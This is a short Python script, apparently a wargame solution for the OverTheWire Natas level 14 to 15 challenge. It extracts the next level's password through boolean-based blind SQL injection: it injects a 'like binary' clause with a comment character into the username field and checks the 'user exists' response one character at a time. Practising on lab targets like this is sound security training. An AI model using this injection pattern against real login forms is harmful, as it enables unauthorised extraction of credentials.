'''
Date: 07/01/2023
Author: autom4il
OtW: Level 14 --> Level 15
'''

import requests
import string
import sys

def get_password(url, chars, auth, proxies):

    password = ""
    for i in range(0,33):
        try:
            for char in chars:
                payload = {"username": f"natas16\" and password like binary \"" + password + f"{char}%\"#"}
                r = requests.post(url, data=payload, auth=auth, proxies=proxies)
                if user_exists in r.text:
                    password += char
                    print('\r' + "The password for the next level is: " + password, end='')
                    sys.stdout.flush()
                    break
        except KeyboardInterrupt:
            sys.exit(1)
    print("\n")

if __name__ == "__main__":

    # set of chars to discover the password
    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits

    # target 
    url = "http://natas15.natas.labs.overthewire.org"

    # credentilas for basic auth
    user = "natas15"
    # Insert the password from the previous level
    password = ""

    # True condition
    user_exists = "This user exists."

    proxies = {"https": "127.0.0.1:8080", "http": "127.0.0.1:8080"}

    auth = (user, password)

    get_password(url, chars, auth, proxies)
